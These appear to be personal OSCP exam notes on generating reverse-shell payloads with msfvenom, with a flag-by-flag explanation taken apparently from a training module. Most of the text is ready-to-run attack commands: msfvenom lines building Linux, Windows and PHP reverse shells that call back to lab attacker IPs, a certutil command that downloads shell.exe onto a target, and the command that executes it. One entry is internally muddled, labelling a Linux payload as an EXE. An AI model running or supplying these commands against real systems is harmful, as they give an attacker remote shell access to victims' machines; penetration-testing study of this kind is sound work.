```
msfvenom -l payloads
```

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

Linux TCP Reverse shell EXE | PORT 445 | shell.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=445 -f exe > shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Windows x64 TCP Reverse shell EXE | PORT 135 | shell.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=135 -f exe > shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
PHP reverse shell | PORT 21 | `phpreverseshell.php`
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p php/reverse_php LHOST=${KaliIP} LPORT=21 -f raw > phpreverseshell.php`;

dv.paragraph("```bash\n" + command + "\n```");
```
Download SHELL.EXE onto target
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -f -urlcache -split http://${KaliIP}/shell.exe C:/Windows/Temp/shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Execute SHELL.EXE
```powershell
C:/Windows/Temp/shell.exe
```
#### Call MSFvenom

  Crafting Payloads with MSFvenom

```shell-session
msfvenom
```

Defines the tool used to make the payload.

#### Creating a Payload

  Crafting Payloads with MSFvenom

```shell-session
-p 
```

This `option` indicates that msfvenom is creating a payload.

#### Choosing the Payload based on Architecture

  Crafting Payloads with MSFvenom

```shell-session
linux/x64/shell_reverse_tcp 
```

Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).

#### Address To Connect Back To

  Crafting Payloads with MSFvenom

```shell-session
LHOST=10.10.14.113 LPORT=443 
```

When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).

#### Format To Generate Payload In

  Crafting Payloads with MSFvenom

```shell-session
-f elf 
```

The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

#### Output

  Crafting Payloads with MSFvenom

```shell-session
> createbackup.elf
```

```
msfvenom -p php/reverse_php LHOST=10.10.14.110 LPORT=443 > shell.php
```

No need -F